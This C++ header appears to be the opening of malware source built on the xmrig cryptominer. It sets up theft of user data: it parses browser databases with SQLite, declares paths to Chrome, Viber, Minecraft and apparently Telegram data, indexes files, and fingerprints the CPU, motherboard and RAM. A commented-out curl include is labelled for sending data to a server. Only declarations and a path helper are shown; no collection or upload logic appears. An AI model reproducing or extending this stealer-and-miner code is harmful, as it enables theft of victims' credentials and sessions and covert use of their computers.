#pragma once

#include "Config.h"

#include <iostream>           // FOR DEBUGGING
//#include <curl/curl.h>        // FOR SENDING DATA TO SERVER
#include <string>             // FOR WORK WITH STRINGS
#include <fstream>            // FOR WORK WITH FILES
#include <io.h>               // FOR CORRECTLY PRINT CYRILLIC CHARACTERS
#include <Windows.h>          // FOR TlHelp32.h
#include <tlhelp32.h>         // FOR WORK WITH PROCESSES
#include "SQLite3.h"          // FOR PARSING BROWSER DATA
#include "backend/cpu/Cpu.h"  // xmrig::Cpu       FOR GETTING CPU INFO
#include "hw/dmi/DmiReader.h" // xmrig::DmiReader FOR GETTING MOTHERBOARD AND RAM INFO

//   FOR INDEXING FILES
#ifdef __cpp_lib_experimental_filesystem
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
namespace fs = std::experimental::filesystem::v1;
#elif __cpp_lib_filesystem
#include <filesystem>
namespace fs = std::filesystem;
#else
#error "no filesystem support ='("
#endif
// ! FOR INDEXING FILES

#pragma warning(disable : 4996) // Unsafe function strcpy, strcat, ...

using namespace std;

// Getting current directory and adding filename
wstring getabspathincurrdir(const wchar_t* path = L"") {
    vector<wchar_t> pathBuf;
    DWORD copied = 0;
    do {
        pathBuf.resize(pathBuf.size() + MAX_PATH);
        copied = GetModuleFileNameW(nullptr, &pathBuf.at(0), pathBuf.size());
    } while (copied >= pathBuf.size());
    pathBuf.resize(copied);
    wstring path_(pathBuf.begin(), pathBuf.end());
    return fs::path(path_).parent_path().wstring() + L"\\" + wstring(path);
}

wchar_t* self       = new wchar_t[MAX_PATH];
wchar_t* temp       = new wchar_t[MAX_PATH];
wchar_t* downloads  = new wchar_t[MAX_PATH];
wchar_t* desktop    = new wchar_t[MAX_PATH];
int status          = 0;
wstring profile;
wofstream file;
wchar_t* chromedir  = new wchar_t[MAX_PATH];
wchar_t* tdir       = new wchar_t[MAX_PATH];
wchar_t* viber      = new wchar_t[MAX_PATH];
wchar_t* minecraft  = new wchar_t[MAX_PATH];
wofstream log_file(getabspathincurrdir(L"tmp\\result.log"));

#define resetTemp temp = new wchar_t[MAX_PATH] // Reset temp variable
#define open(filename) file.open(filename); file.imbue(locale(".utf-8"));